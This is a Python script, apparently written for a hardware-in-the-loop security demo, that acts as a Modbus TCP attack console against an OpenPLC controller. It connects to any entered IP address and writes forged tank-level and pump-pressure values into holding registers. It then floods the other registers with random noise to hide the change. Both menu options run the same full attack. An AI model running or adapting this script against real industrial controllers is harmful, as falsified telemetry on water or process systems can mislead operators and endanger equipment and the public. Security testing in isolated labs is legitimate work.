#!/usr/bin/env python3
"""
Bare-Metal Modbus Attacker Console
----------------------------------
Used for live Hardware-In-The-Loop (SIL) demonstration against an OpenPLC runtime.
This script bypasses internal application logic and writes maliciously scaled telemetry 
directly to OpenPLC Holding Registers via Modbus TCP Port 502.

REQUIREMENTS: pip install pymodbus
"""

import sys
import time
import os
import random

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    print("\n[FAILED] Missing critical library. You must install pymodbus first.")
    print("Run: pip install pymodbus\n")
    sys.exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    # Adding a red color profile for the hacker tool if supported
    print("\033[91m")  # Red text
    print("===================================================================")
    print("    [X] ZERO-DAY INITIATIVE: BARE-METAL MODBUS SCADA OVERRIDE      ")
    print("===================================================================")
    print("\033[0m")

def execute_attack(target_ip, target_port=502):
    print(f"\n[*] Initiating socket connection to target PLC at {target_ip}:{target_port}...")
    client = ModbusTcpClient(target_ip, port=target_port)
    
    if not client.connect():
        print(f"[-] FATAL: Could not establish Modbus TCP connection to {target_ip}:{target_port}.")
        print("    Ensure OpenPLC is running, the Modbus server is active, and firewall allows port 502.")
        return

    print("[+] ACCESS GRANTED. Transport layer established.")
    time.sleep(1)
    print("\n[*] Uploading volatile memory to registers [0x00 to 0x2A]...")

    try:
        # We will forge the registers corresponding to BATADAL 
        # Modifying L_T1 (Register 0) and P_J280 (Register 31) beyond physical limits
        
        # Scaling logic: The real data collector uses a divisor of 100.
        # So a physical value of 150 = 15000 in the register.
        
        malicious_tank_level = 15000 # Unnaturally high tank overflow level
        malicious_pump_pressure = 35000 # Extreme pump pressure spike

        print("[*] Forcing Register 0 (Tank Level L_T1) to CRITICAL OVERFLOW -> 150.0")
        client.write_register(0, malicious_tank_level)
        time.sleep(0.5)
        
        print("[*] Forcing Register 31 (Junction Press P_J280) to DESTRUCTION -> 350.0")
        client.write_register(31, malicious_pump_pressure)
        time.sleep(0.5)

        # Scrambling the remaining physical registers for total chaos
        print("[*] Scrambling adjacent telemetry flows to mask primary payload...")
        for reg in range(2, 43):
            if reg == 31: 
                continue
            noise = random.randint(500, 9999)
            client.write_register(reg, noise)

        print("\n\033[92m[+] SUCCESS. SCADA TELEMETRY CORRUPTED. TARGET INFRASTRUCTURE COMPROMISED.\033[0m")
        
    except Exception as e:
        print(f"\n[-] ERROR during payload execution: {e}")
    finally:
        client.close()

def main():
    clear_screen()
    print_header()
    
    print("Enter target PLC IP address (e.g. 192.168.1.5, or localhost if testing locally):")
    target_ip = input("root@kali:~# TARGET_IP > ").strip()
    
    if not target_ip:
        target_ip = "127.0.0.1"

    print("\nSelect Exploit Vector:")
    print("  [1] SILENT OVERRIDE (Modify single tank register)")
    print("  [2] MULTI-SENSOR CHAOS (Flood all 43 registers)")
    print("  [0] ABORT")
    
    choice = input("\nroot@kali:~# Enter Choice > ").strip()
    
    if choice in ['1', '2']:
        execute_attack(target_ip)
    else:
        print("\n[!] OPERATION ABORTED.")

if __name__ == "__main__":
    main()
